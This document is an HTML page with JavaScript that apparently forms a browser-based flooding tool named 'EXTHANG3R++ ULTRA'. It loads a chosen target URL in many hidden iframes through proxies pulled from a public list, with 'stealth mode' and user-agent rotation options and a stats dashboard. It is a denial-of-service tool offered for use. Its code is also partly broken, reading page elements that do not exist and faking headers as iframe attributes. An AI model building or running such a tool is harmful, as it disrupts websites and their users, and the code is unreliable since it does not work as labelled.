<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EXTHANG3R++ ULTRA</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background: #121212;
      color: #00FF00;
      overflow-x: hidden;
    }

    h1 {
      text-align: center;
      color: #00FF00;
      margin-top: 20px;
      font-size: 2em;
    }

    .container {
      width: 90%;
      max-width: 900px;
      margin: 0 auto;
      background: #333;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      box-sizing: border-box;
    }

    .container label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }

    input, button, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #888;
    }

    button {
      background-color: #00FF00;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }

    button.stop {
      background-color: #FF4444;
    }

    button:hover {
      opacity: 0.9;
    }

    .status {
      text-align: center;
      font-weight: bold;
      color: #00FF00;
      margin-top: 20px;
    }

    .error {
      color: #FF4444;
      font-weight: bold;
    }

    .stats {
      margin-top: 15px;
      color: #00FF00;
    }

    .input-group {
      position: relative;
      margin-bottom: 15px;
    }
    
    /* Responsive Design */
    @media (max-width: 768px) {
      .container {
        width: 100%;
        padding: 15px;
      }
    }
  </style>
</head>
<body>

  <h1>EXTHANG3R++ ULTRA</h1>

  <div class="container">
    <!-- Target URL -->
    <div class="input-group">
      <label for="targetUrl">Target URL:</label>
      <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
    </div>

    <!-- Number of Iframes -->
    <div class="input-group">
      <label for="iframeCount">Number of Iframes:</label>
      <input type="number" id="iframeCount" value="50" min="1">
    </div>

    <!-- Delay Between Iframes -->
    <div class="input-group">
      <label for="delay">Delay Between Iframes (ms):</label>
      <input type="number" id="delay" value="1000" min="0">
    </div>

    <!-- Random Subdomain -->
    <div class="input-group">
      <label for="randomSubdomain">Enable Random Subdomain:</label>
      <input type="checkbox" id="randomSubdomain">
    </div>

    <!-- Random Query -->
    <div class="input-group">
      <label for="randomQuery">Enable Random Query Strings:</label>
      <input type="checkbox" id="randomQuery">
    </div>

    <!-- High Memory Mode -->
    <div class="input-group">
      <label for="highMemory">Enable High Memory Mode:</label>
      <input type="checkbox" id="highMemory">
    </div>

    <!-- Stealth Mode -->
    <div class="input-group">
      <label for="stealthMode">Enable Stealth Mode:</label>
      <input type="checkbox" id="stealthMode">
    </div>

    <!-- User-Agent Rotation -->
    <div class="input-group">
      <label for="userAgentRotation">Enable User-Agent Rotation:</label>
      <input type="checkbox" id="userAgentRotation">
    </div>

    <!-- Auto Stop Timer -->
    <div class="input-group">
      <label for="autoStopTimer">Auto Stop Timer (s):</label>
      <input type="number" id="autoStopTimer" value="60" min="0">
    </div>

    <!-- Start/Stop Buttons -->
    <button onclick="startFlood()">Start Flooding</button>
    <button class="stop" onclick="stopFlood()">Stop Flooding</button>

    <div class="status" id="status">Ready</div>

    <!-- Stats Dashboard -->
    <div id="dashboard">
      <h3>Flooding Stats</h3>
      <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
      <p class="stats">Failures: <span id="failureCount">0</span></p>
      <p class="stats">Current Target: <span id="currentTarget">None</span></p>
    </div>
  </div>

  <script>
    let flooding = false;
    let frameCount = 0;
    let failureCount = 0;
    let currentTarget = '';
    let proxyList = [];
    let userAgentRotation = false;
    let targetRotation = [];
    let currentProxyIndex = 0;
    let currentTargetIndex = 0;

    // Tooltip visibility
    document.querySelectorAll('.input-group').forEach(group => {
      group.addEventListener('mouseover', () => {
        group.querySelector('.tooltip').style.display = 'block';
      });
      group.addEventListener('mouseout', () => {
        group.querySelector('.tooltip').style.display = 'none';
      });
    });

    // Proxy fetch function
    async function fetchProxies() {
      try {
        const response = await fetch('https://www.proxy-list.download/api/v1/get?type=https');
        const data = await response.text();
        proxyList = data.split('\r\n');
      } catch (error) {
        console.error('Failed to fetch proxies, using default:', error);
        proxyList = [
          'http://proxy1.com', 'http://proxy2.com', 'http://proxy3.com'
        ]; // Default proxies
      }
      console.log('Proxies Loaded:', proxyList);
    }

    // Random proxy getter
    function getRandomProxy() {
      return proxyList[Math.floor(Math.random() * proxyList.length)];
    }

    // Start flooding
    function startFlood() {
      if (flooding) return;
      flooding = true;
      document.getElementById('status').innerText = "Flooding in progress...";

      currentTarget = document.getElementById('targetUrl').value;
      targetRotation = document.getElementById('targetRotation').value.split(',');
      fetchProxies();

      const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
      const delay = parseInt(document.getElementById('delay').value);

      floodIframes(currentTarget, delay, customHeaders);
    }

    // Flooding logic
    function floodIframes(target, delay, customHeaders) {
      const iframeCount = parseInt(document.getElementById('iframeCount').value);
      for (let i = 0; i < iframeCount; i++) {
        setTimeout(() => {
          loadIframe(target, customHeaders);
          frameCount++;
          document.getElementById('frameCount').innerText = frameCount;
        }, delay * i);
      }
    }

    // Load iframe with random proxy and headers
    function loadIframe(target, customHeaders) {
      const iframe = document.createElement('iframe');
      iframe.src = target;
      iframe.style.width = "0";
      iframe.style.height = "0";
      iframe.style.border = "none";
      
      const proxy = getRandomProxy();
      iframe.src = `${proxy}${target}`;

      customHeaders.forEach(header => {
        const [key, value] = header.split(':');
        if (key && value) {
          iframe.setAttribute('X-Forwarded-For', value.trim());
        }
      });

      document.body.appendChild(iframe);
      currentTargetIndex++;
      document.getElementById('currentTarget').innerText = currentTarget;
    }

    // Stop flooding
    function stopFlood() {
      flooding = false;
      document.getElementById('status').innerText = "Flooding stopped.";
    }
  </script>
</body>
</html>
